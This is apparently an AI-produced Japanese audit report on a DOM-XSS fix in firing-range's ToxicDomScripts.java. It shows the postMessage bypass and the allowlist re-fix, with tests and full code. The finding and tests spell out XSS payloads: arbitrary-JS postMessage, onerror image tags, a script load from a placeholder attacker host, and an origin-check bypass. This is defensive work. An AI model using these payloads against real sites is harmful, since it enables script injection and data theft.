@@ -1,0 +1,212 @@
+## No.18 google/firing-range src/tests/dom/ToxicDomScripts.java
+
+- 検証した修正コード: "修正版コード"
+- 検証結果: **不備あり** — sink は SAFE_SINK にしたが source は無制限で、/dom/toxicdomscripts/postMessage/<6 種>/<任意> では postMessage の値が eval・innerHTML・document.write に渡り、別オリジンから 24/24 件で実行（headless Chrome で確認）。修正コード2: source/accessType を値を payload に渡すだけの 10 種の許可リストに限定、それ以外は 400
+- 修正コード2 のファイル: src/tests/dom/ToxicDomScripts.java
+- 親の確認: src/tests/dom/ToxicDomScripts.java: 構文確認なし（この環境に Java の実行環境がないため。エージェントも Java は実行していない）。エージェントが読み取り専用の材料（orig・given）を変えていないこと、読まない範囲のファイルを読んでいないことを、記録で確認した。
+- 親の注記: No.17 の修正コード2 との関係は、No.17 の「親の注記」を参照（どちらか一方だけでも 4 階層 external の postMessage の経路を塞ぐ。両方入れても矛盾しない）。
+- 使用トークン量（検証）: 新規 125,064（入力 52 ／ キャッシュ作成 79,491 ／ 出力〔推定〕 45,521）、キャッシュ読込 1,403,625、総処理 1,528,689、リクエスト 26 回
+- 使用トークン量（再修正）: 新規 36,878（入力 18 ／ キャッシュ作成 22,724 ／ 出力〔推定〕 14,136）、キャッシュ読込 970,974、総処理 1,007,852、リクエスト 9 回
+
+- 修正コード2のファイル: `fix2/src/tests/dom/ToxicDomScripts.java`（元の修正コード `given/fix_xss/src/tests/dom/ToxicDomScripts.java` に、必要な変更だけを加えたもの）
+- 検証結果: **不備あり**（DOM-based XSS が、postMessage 系の source テンプレートを経由する経路で残っていた）
+
+### 元の修正コードの不備
+
+#### 不備1: sink を内蔵した source テンプレート（sources/postMessage/*.tmpl）を経由すると、DOM-based XSS が残る
+
+- 場所: `ToxicDomScripts.java`（元の修正コード）L60-66 の `generateTemplate`
+  ```java
+  String sourcePath = "sources/" + source + "/" + accessType + ".tmpl";            // L62
+  String sourceTemplate = Templates.getTemplate(sourcePath, ToxicDomScripts.class); // L63
+  // 修正: 指定された危険な sink テンプレート（eval / innerHTML / document.write）は読み込まず、
+  // payload を文字列として扱う安全な sink に置き換える
+  String sinkTemplate = SAFE_SINK;                                                  // L66
+  ```
+- 問題の内容:
+  - 元の修正は、URL の 3 番目の要素（sink）で選ぶ `sinks/<sink>.tmpl` だけを、textContent に代入する安全な `SAFE_SINK` に置き換えた。一方で、1・2 番目の要素で選ぶ source テンプレートは、元のコードと同じく何の制限もなく読み込んでいる（`Templates.getTemplate` が禁止するのは `..` だけ）。
+  - 同じディレクトリの `sources/postMessage/` には、テンプレートの中で危険な sink を直接使うものが 6 種ある（同じコミットの `src/pages/dom/index.html` からもリンクされている）。
+    | テンプレート | 危険な処理 |
+    |---|---|
+    | postMessage/eval.tmpl L2-3 | `var content = msg.data; var msgObj = eval(content);`（origin の確認なし） |
+    | postMessage/innerHtml.tmpl L2-4 | `JSON.parse(msg.data)` の `content.html` を `div.innerHTML` に代入 |
+    | postMessage/documentWrite.tmpl L2-3 | `content.url` を `document.write('<scr'+'ipt src="' + content.url + '">…')` に渡す |
+    | postMessage/complexMessageDocumentWriteEval.tmpl L4,L6,L8 | `eval(msg.data.payload)`、`document.write(msg.data.html)` など |
+    | postMessage/improperOriginValidationWithPartialStringComparison.tmpl L2-3 | `msg.origin.includes('www.google.com')` だけを確かめて `eval(msg.data)` |
+    | postMessage/improperOriginValidationWithRegExp.tmpl L2-4 | `/https?:\/\/www.google.com/` に一致すれば `eval(msg.data)`（先頭・末尾を固定していない） |
+  - そのため、`/dom/toxicdomscripts/postMessage/<上の 6 種>/<sink>` に対して修正コードが返す JavaScript には、外部（別オリジンのページ）から受け取った値を eval / innerHTML / document.write に渡す処理がそのまま残る。修正の説明にある「危険な sink（eval / innerHTML / document.write）は読み込まない」は、この経路では成り立っていない。
+  - 判定の根拠と同じサーブレット、同じ `generateTemplate` が生成する JS の DOM-based XSS（CWE-79）で、原因も同じ（外部から入る値を無害化せずに危険な DOM/JS API に渡す JS を返す）。修正を回り込む「別の経路」にあたる。
+- 問題になる入力・条件:
+  - 被害者ページ `/dom/toxicdom/external/postMessage/eval/eval`（ToxicDom.java の external 形式。`<script src="/dom/toxicdomscripts/postMessage/eval/eval">` を読み込む）を、攻撃者が別オリジンのページから iframe や window.open で開く。続けて `postMessage("任意のJavaScript", "*")` を送ると、被害者のオリジンで任意のスクリプトが動く。innerHtml なら `{"html":"<img src=x onerror=...>"}`、documentWrite なら `{"url":"https://攻撃者/evil.js"}`、complexMessageDocumentWriteEval なら `{action:'exec', payload:'...'}` を送る。improperOriginValidation の 2 種は、攻撃者の origin が `http://www.google.com.<攻撃者のドメイン>` のような形なら通過する。
+  - 元の修正コードは sink 引数を使わないので、3 番目の要素は存在しない名前（例: `xyz`）でもよい。
+- 実際に確かめたか: **確かめた**。Java のロジックを写した試験用サーバ（SAFE_SINK は Java ファイルから読み取る）と headless Chrome 156 を使い、攻撃者のページを別オリジン `http://www.google.com.localhost:PORT` に置いた。被害者 `http://127.0.0.1:PORT/dom/toxicdom/external/postMessage/<6 種>/<eval|innerHtml|documentWrite|xyz>` に postMessage を送ると、元の修正コードでは **24 件中 24 件** で、被害者のオリジンからコードが実行されたことを示すメッセージ（`PWNED:...:http://127.0.0.1:PORT`）が返ってきた。元のコード（修正前）でも 24 件中 18 件（xyz は 400）で、この経路は修正の前後で直っていない。
+
+#### 指摘（単独では不備としない）: sink 引数を使わなくなったため、存在しない sink 名でも 200 で JS を返す
+
+- 場所: 元の修正コード L64-66（`sinkPath` と `Templates.getTemplate(sinkPath, …)` を削除）
+- 元のコードでは、存在しない sink 名（例: `/dom/toxicdomscripts/localStorage/array/xyz`）は、テンプレートが見つからないため IOException になり、400 を返していた。元の修正コードでは 200 で JS を返す（試験で確認）。不備1 と組み合わさり、脆弱なスクリプトを返す URL が増えていた（`/dom/toxicdomscripts/postMessage/eval/<任意の文字列>`）。修正コード2では、不備1 の対策（source の allowlist）でこの組み合わせは 400 になる。sink 名の扱いそのものは変えていない（下の「副作用・残る点」を参照）。
+
+### 再修正の内容
+
+変更は 3 か所で、どれも `【修正2】` のコメントを付けた。元の修正（`SAFE_SINK` と、その「修正:」コメント）は、内容を変えずに残した。
+
+#### 変更1: import の追加（L4）
+```java
+import com.google.common.collect.ImmutableSet;
+```
+- allowlist を変更できない集合として持つため、Guava の `ImmutableSet` を使う。このプロジェクトは build.xml で guava-18.0.jar を取得し、元のコードも `com.google.common.base.CharMatcher` を使っている。新しい依存は増えない。
+
+#### 変更2: 読み込んでよい source テンプレートの allowlist `ALLOWED_SOURCES`（L43-60）
+```java
+private static final ImmutableSet<String> ALLOWED_SOURCES = ImmutableSet.of(
+    "document/cookie", "document/cookie_set", "document/referrer",
+    "localStorage/array", "localStorage/function", "localStorage/property",
+    "sessionStorage/array", "sessionStorage/function", "sessionStorage/property",
+    "window/name");
+```
+- 何をしたか: `"<source>/<accessType>"` の形で、読み込んでよい source テンプレートを 10 個挙げた。
+- なぜこの 10 個か: 同じコミットのテンプレートを全部読んで確かめた。この 10 個は、ブラウザの値（Web Storage、window.name、cookie、referrer）を変数 `payload` に入れ、10ms 後に `trigger(値)` を呼ぶだけで、自分では eval / innerHTML / document.write などの危険な処理をしない。`SAFE_SINK` は `trigger` と `payload` の受け口を textContent への代入として定義しているので、この 10 個と組み合わせれば、値は文字列として表示されるだけになる。判定の記録で挙げた source（localStorage・sessionStorage・window.name・document.cookie・document.referrer）がこれにあたる。
+- なぜ allowlist にしたか（denylist にしなかった理由）: `postMessage` だけを禁止する denylist でも今の 6 種は防げる。しかし、sink を内蔵したテンプレートが今後ほかのディレクトリに増えたとき、それを読み込んでしまう。安全と確かめたものだけを許す allowlist なら、未知のテンプレートは読み込まれない。テンプレートの中身を実行時に検査する（`eval(` などの文字列を探す）方法は、書き方の違いで回り込まれやすいため使わなかった。
+- `ImmutableSet.of(E e1, …, E e6, E... others)` は Guava 18 にある多引数版で、10 個の String をそのまま渡せる。
+
+#### 変更3: `generateTemplate` の先頭で allowlist を確かめる（L82-87）
+```java
+if (!ALLOWED_SOURCES.contains(source + "/" + accessType)) {
+  throw new IllegalArgumentException("Unsupported source.");
+}
+```
+- 何をしたか: テンプレートを読み込む前に、URL から取り出した `source` と `accessType` を `/` でつなぎ、allowlist にあるかを完全一致で確かめる。ない場合は `IllegalArgumentException` を投げる。
+- どう動くか: `doGet` は元から `IllegalArgumentException | IOException | ArrayIndexOutOfBoundsException` を catch して `Responses.sendError(response, e.getMessage(), 400)` を呼ぶ（L70-71）。そのため、`/dom/toxicdomscripts/postMessage/eval/eval` などは、JavaScript ではなく 400（Content-Type: text/plain、本文 `Unsupported source.`）になる。読み込み側の `<script src>` は 400 の応答を実行しないので、postMessage のハンドラは登録されない。
+- 比較は大文字と小文字を区別する完全一致なので、`PostMessage/eval`、`localstorage/array`、`localStorage/Array`、空白の混ざった値なども拒否される。`..` を含む値も allowlist にないので拒否される（元から `Templates.getTemplate` でも拒否される）。
+- エラーの本文には利用者の入力を含めない（`sendError` は HTML エスケープして text/plain で返すが、入力を返さないほうが安全なため）。
+- 許可された 10 個の場合、出力は元の修正コードとまったく同じ（source テンプレート + `SAFE_SINK`）。
+
+### 確認した内容と結果
+
+javac がないため、Java は読んで確認し、動作は Java のロジックを Python で写した試験用サーバで確かめた。`bench/emu.py` は `ToxicDomScripts.doGet` / `generateTemplate` と `Templates.getTemplate` を写したもので、`SAFE_SINK` の文字列と `ALLOWED_SOURCES` の集合は、検証する Java ファイルから読み取る。試験用サーバは 127.0.0.1 だけで待ち受け、終わったら止めた。テンプレートは同じコミット 4f991a6 のものを使った。
+
+1. Java の読み取り確認（修正コード2）
+   - import の追加は `com.google.common.collect.ImmutableSet` だけ（Guava 18 にあり、build.xml で取得している）。`ImmutableSet<String>` の型と `contains(Object)` は正しい。文字列・コメントを除いて数えた括弧の対応は、`{}` 8/8、`()` 26/26、`[]` 3/3。`ImmutableSet.of` の引数は 10 個。投げる例外は `IllegalArgumentException`（非検査例外）なので、`throws` の宣言は変えなくてよい。また doGet の既存の catch で受けられる。
+2. 生成 JS の構文確認（`bench/syntax.sh`、node --check）
+   - source 16 種 × sink 3 種 = 48 通りのうち、許可された 30 通りは構文 OK（30/30）、postMessage 系の 18 通りは 400。
+   - 200 で返る 30 通りの出力に `eval(` / `innerHTML` / `document.write` を含むものは 0 件。出力は元の修正コードと 30/30 で一致した（cmp）。
+3. 境界の入力（emu.py gen）
+   - `PostMessage/eval/eval`、`localstorage/array/eval`、`localStorage/Array/eval`、`localStorage/array /eval`、`postMessage/eval/`、`localStorage/array/`、`window/name/eval/x`、`../sources/eval` → すべて 400。`localStorage/array/xyz` → 200（安全な SAFE_SINK の JS。元の修正コードと同じ）。`document/cookie_set/innerHtml` → 200。
+   - 実際の HTTP（curl）でも、`postMessage/eval/eval`・`postMessage/innerHtml/xyz`・`postMessage/improperOriginValidationWithRegExp/eval` → 400 text/plain、`localStorage/array/eval`・`window/name/innerHtml`・`document/referrer/documentWrite` → 200 text/javascript。
+4. ブラウザでの攻撃の入力の確認（headless Chrome 156、`bench/run_browser.sh`）
+   - 同一オリジンの攻撃（`bench/pages/harness.html`、132 件）: localStorage 3 種・sessionStorage 3 種・window.name・cookie 2 種 × eval / innerHtml / documentWrite に、`parent.__hit('eval')`、`<img src=x onerror=…>`、回り込みを狙う 8 種（`<script>`、`<svg onload>`、大文字の `<IMG ONERROR>`、`">` で属性から抜ける形、`&lt;` 実体参照、`javascript:` URL、`'` で文字列から抜ける形、iframe srcdoc）を入れた。referrer は、パスに `'` を含む中継ページから遷移させた。結果は、元のコード 37 件実行（陽性対照）、元の修正コード 0 件、**修正コード2 0 件**。
+   - 別オリジンからの postMessage 攻撃（`bench/pages/attacker.html`、攻撃者 `http://www.google.com.localhost:PORT`、24 件）: 元のコード 18 件、元の修正コード 24 件で実行。**修正コード2 0 件**（スクリプトが 400 になり、ハンドラが登録されない）。
+5. 正常な入力での動作（harness の normal モード、30 件）
+   - 修正コード2では、許可された 10 種の source × 3 sink のすべてで、元の修正コードと同じく、既定値（乱数、`badvalue='a'`、`"a"`、`referrer = '…'`）が div に文字列として表示された。payload の実行は 0 件で、Chrome のコンソールにもエラーは出なかった。
+
+### 副作用・残る点
+
+- **postMessage 系の 6 種の URL が使えなくなる**: `/dom/toxicdomscripts/postMessage/*/*` は 400 を返す。これらはテンプレートそのものが XSS の本体なので、無害化して残す方法はない。ToxicDom.java の external 形式（`/dom/toxicdom/external/postMessage/...`）のページは表示されるが、スクリプトの読み込みは 400 で失敗する。
+- **新しい source テンプレートを追加するときは allowlist に加える必要がある**: 追加するときは、そのテンプレートが値を `payload` / `trigger()` に渡すだけで、危険な処理を持たないことを確かめてから加える。
+- **sink 名は今も検査していない**（元の修正コードと同じ）: 許可された source なら、存在しない sink 名（例: `xyz`）でも 200 で安全な JS を返す。元のコード（修正前）の 400 とは違う。安全な SAFE_SINK を返すだけで脆弱性にはならないので、変更は必要な範囲にとどめ、直していない。
+- **元の修正による動作の変化（変えていない）**: eval / innerHtml / documentWrite のどれを指定しても、値は文字列として表示される。firing-range は脆弱性スキャナを試すための意図的に脆弱なサイトなので、この URL では XSS を検出できなくなる（修正の目的どおり）。document/cookie の値が undefined のとき、元のコード（innerHtml）は "undefined"、修正後は空文字を表示する。実害はない。
+- **このファイルの外で残る点（今回は対象外）**: ToxicDom.java の `/dom/toxicdom/<source>/<accessType>/<sink>`（インライン形式）と `/dom/toxicdom/postMessage/<name>`（accessless 形式）は、ToxicDom.java 自身がテンプレートを読み込んでページに埋め込む。ToxicDomScripts.java の修正では直らない。また、`doGet` の `request.getPathInfo()` が null のとき（`/dom/toxicdomscripts` に末尾の `/` がない場合）の NullPointerException も元のコードからある問題で、XSS とは関係がないため変えていない。
+
+### 修正コード2 の全文: src/tests/dom/ToxicDomScripts.java
+
+```java
+package com.google.testing.security.firingrange.tests.dom;
+
+import com.google.common.base.CharMatcher;
+import com.google.common.collect.ImmutableSet;
+import com.google.testing.security.firingrange.utils.Responses;
+import com.google.testing.security.firingrange.utils.Templates;
+
+import java.io.IOException;
+
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
+/**
+ * A servlet to provide toxic DOM based XSSes inside a JavaScript file. It is
+ * mapped to the whole /dom/toxicdomscripts/ directory and maps paths as follows:
+ * <ul>
+ *     <li> Source object
+ *     <li> Source property
+ *     <li> Sink
+ * </ul>
+ *
+ * Thus, {@code /dom/toxicdomscripts/document/cookie/eval} will map to the document.cookie source,
+ * and the eval sink.
+ */
+public final class ToxicDomScripts extends HttpServlet {
+
+  private static final String TOXIC_TEMPLATE = "toxicdomscript.tmpl";
+
+  // 修正: eval / innerHTML / document.write の代わりに使う安全な sink。
+  // payload を textContent に代入するので、HTML や JavaScript として解釈されない。
+  // 外部スクリプトは body より前に読み込まれる場合もあるため、documentElement に追加する。
+  private static final String SAFE_SINK =
+      "var div = document.createElement('div');\n"
+      + "document.documentElement.appendChild(div);\n"
+      + "// Sync trigger.\n"
+      + "div.textContent = payload;\n"
+      + "// Async trigger.\n"
+      + "function trigger(payload) {\n"
+      + "  div.textContent = payload;\n"
+      + "}\n";
+
+  // 【修正2】読み込んでよい source テンプレート（"<source>/<accessType>"）の allowlist。
+  // ここに挙げたものは、値を変数 payload に入れ、trigger(値) を呼ぶだけで、危険な処理を持たない。
+  // そのため、上の SAFE_SINK と組み合わせれば、値は文字列として表示されるだけになる。
+  // sources/postMessage/*.tmpl（eval / innerHtml / documentWrite / complexMessageDocumentWriteEval /
+  // improperOriginValidation*）は、テンプレートの中で postMessage の値を eval・innerHTML・
+  // document.write に渡しているため、sink を SAFE_SINK に置き換えても XSS が残る。これらは
+  // 許可しない。一覧にないもの（今後追加されるテンプレートを含む）も、同じ理由で読み込まない。
+  private static final ImmutableSet<String> ALLOWED_SOURCES = ImmutableSet.of(
+      "document/cookie",
+      "document/cookie_set",
+      "document/referrer",
+      "localStorage/array",
+      "localStorage/function",
+      "localStorage/property",
+      "sessionStorage/array",
+      "sessionStorage/function",
+      "sessionStorage/property",
+      "window/name");
+
+  @Override
+  public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+    String pathInfo = request.getPathInfo().substring(1);
+
+    if (CharMatcher.is('/').countIn(pathInfo) == 2) {
+      try {
+        Responses.sendJavaScript(response, generateTemplate(
+            pathInfo.split("/")[0], pathInfo.split("/")[1], pathInfo.split("/")[2]));
+      } catch (IllegalArgumentException | IOException | ArrayIndexOutOfBoundsException e) {
+        Responses.sendError(response, e.getMessage(), 400);
+      }
+    } else {
+      String errorMsg = String.format("Missing sink, not enough sinks or too many sinks :(."
+          + "Got %d, expected 2", CharMatcher.is('/').countIn(pathInfo));
+      Responses.sendError(response, errorMsg, 400);
+    }
+  }
+
+  private String generateTemplate(String source, String accessType, String sink)
+      throws IOException {
+    // 【修正2】allowlist にない source / accessType の組み合わせは、テンプレートを読む前に拒否する。
+    // IllegalArgumentException は doGet の catch で受けて、400（text/plain・HTML エスケープ済み）を返す。
+    // エラーの本文には、利用者の入力を含めない。
+    if (!ALLOWED_SOURCES.contains(source + "/" + accessType)) {
+      throw new IllegalArgumentException("Unsupported source.");
+    }
+    String sourcePath = "sources/" + source + "/" + accessType + ".tmpl";
+    String sourceTemplate = Templates.getTemplate(sourcePath, ToxicDomScripts.class);
+    // 修正: 指定された危険な sink テンプレート（eval / innerHTML / document.write）は読み込まず、
+    // payload を文字列として扱う安全な sink に置き換える
+    String sinkTemplate = SAFE_SINK;
+
+    String toxicTemplate = Templates.getTemplate(TOXIC_TEMPLATE, ToxicDomScripts.class);
+    return Templates.replacePayload(toxicTemplate, sourceTemplate + sinkTemplate);
+  }
+}
+```
+
+---
